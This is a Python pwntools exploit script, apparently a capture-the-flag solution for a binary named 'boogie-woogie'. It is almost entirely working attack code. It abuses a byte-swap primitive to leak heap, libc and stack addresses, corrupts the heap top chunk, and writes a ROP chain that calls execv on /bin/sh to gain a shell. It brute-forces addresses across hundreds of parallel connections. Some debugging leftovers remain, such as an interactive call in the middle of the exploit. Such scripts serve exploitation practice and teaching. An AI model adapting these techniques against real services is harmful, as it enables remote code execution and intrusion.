from pwn import *
from multiprocessing import Pool
from tqdm.contrib.concurrent import process_map
from tqdm import tqdm
from multiprocessing import Lock

libc = ELF("./src/libc.so.6")
context.arch = "amd64"
context.log_level = "error"

lock = Lock()


def parse_map_line(line):
    # split on spaces
    line = line.split(" ")
    # remove empty strings
    line = [l for l in line if l]
    # split first element on - and parse, if possible
    if len(line):
        line[0] = line[0].split("-")
        line[0] = (int(line[0][0], 16), int(line[0][1], 16))

        return line
    return [1, 1, "meow"]


def get_offset(pid):
    with open(f"/proc/{pid}/maps") as f:
        maps = [parse_map_line(m) for m in f.read().split("\n")]
        # get heap base
        heap_base = [m for m in maps if m[-1] == "[heap]"][0][0][0]
        # get binary base
        bin_end = [m for m in maps if "boogie-woogie" in m[-1]][-1][0][0]
        offset = heap_base - bin_end + 0x10000
        return offset


def exploit(p, heap):
    data_arr = 0

    def prep_swap(a, b):
        return f"{(a)} {(b)}\n".encode()

    def do_swap(content, n=1):
        p.sendafter(b"exception:", content)
        for _ in range(n):
            p.recvuntil(b"\n\x1b[31;49;1;4m")
            msg = p.recvuntil(b"\x1b[0m", drop=True)
        return msg

    def swap(a, b):
        return do_swap(prep_swap(a, b))

    def read_u64(offset):
        for i in range(8):
            leak22 = swap(offset + i, i)
            print("leak: " + repr(leak22))
        return u64(leak22.ljust(8, b"\x00"))

    def read_mem(offset, sz):
        mem = b"\x00"
        for i in range(sz):
            new_mem = swap(offset + i, len(mem))
            if len(new_mem) > len(mem):
                mem += new_mem[len(mem) : len(mem) + 1]
            else:
                mem += b"\x00"
            with open("mem", "wb") as f:
                f.write(mem)

        return mem[1 : sz + 1]

    print("heap: " + hex(heap))

    # context.log_level = 'debug'

    stdin_buf = 0x6B0 + heap
    stdout_buf = 0x1200 + heap
    top_chunk_offset = 0x16B0 + heap
    print("stdin_buf: " + hex(stdin_buf))

    mem = read_mem(heap + stdout_buf + 0x50, 0x1000)

    print("top_chunk_offset: " + hex(top_chunk_offset))

    pause()

    # zero 2nd byte & shrink size of 1st byte
    print(
        repr(
            do_swap(
                flat(
                    b" ",
                    prep_swap(top_chunk_offset + 8 + 2, top_chunk_offset + 8 + 2),
                    prep_swap(stdin_buf + 0x50, top_chunk_offset + 8 + 1),
                    prep_swap(stdin_buf + 0x50, stdin_buf),
                ).ljust(0x50, b" ")
                + b"\x05",
                n=3,
            )
        )
    )

    # cause heap allocation & free top chunk
    p.interactive()

    print("doing alloc")
    do_swap(prep_swap("0" * 0x800, 2))

    # get top chunk fd ptr (libc)
    libc.address = read_u64(top_chunk_offset + 16) - 0x219CE0  # - 0x21ace0
    print("libc: " + hex(libc.address))

    # get data array from dso handle (exe)
    data_arr = read_u64(-0x18) + 0x18
    print("data_arr: " + hex(data_arr))

    # stack to rop
    stack = read_u64(libc.sym["environ"] - data_arr)
    print("stack: " + hex(stack))

    rop = ROP(libc)
    rop.execv(next(libc.search(b"/bin/sh\x00")), 0)
    rop = bytes(rop)

    # append addresses at the end of the io buffer
    ret_addr_offset = -data_arr + stack - 288

    do_swap(
        flat(
            *(
                prep_swap(stdin_buf + 0x800 + i, ret_addr_offset + i)
                for i in range(len(rop))
            ),
            prep_swap(0, 0),
        ).ljust(0x800, b"\x00")
        + rop,
        n=len(rop),
    )


def conn(p):
    def swap(a, b):
        p.sendlineafter(b"exception:", f"{a} {b}".encode())
        p.recvuntil(b"\n\x1b[31;49;1;4m")
        return p.recvuntil(b"\x1b[0m", drop=True)

    offset = 0x200000  # this can be guessed for bruteforce
    # offset = get_offset(p.pid)

    guess = offset - 0x20 + 0x8
    # once we get a non-zero byte @ start of heap, we'll get a length increase
    while len(swap(1, guess)) == 1:
        guess -= 0x1000
    return guess - 8


def make_attempt(_):
    lock.acquire()
    lock.release()
    # p = process("./src/boogie-woogie")
    # p = process("exec script -E never -q -c \"./src/boogie-woogie\" /dev/null", shell=True)
    # p.interactive()
    # gdb.attach(p)
    # pause()
    p = remote("localhost", 5000)
    # p.log_level = 'error'

    # p = remote("mc.ax", 31040)
    try:
        heap = conn(p)
    except KeyboardInterrupt:
        exit()
    except:
        p.close()
        return
    with lock:
        exploit(p, heap)
    p.interactive()


if __name__ == "__main__":
    process_map(make_attempt, range(0x200))
    # make_attempt(0)
    # for i in tqdm(range(0x200)):
    #     make_attempt(i)
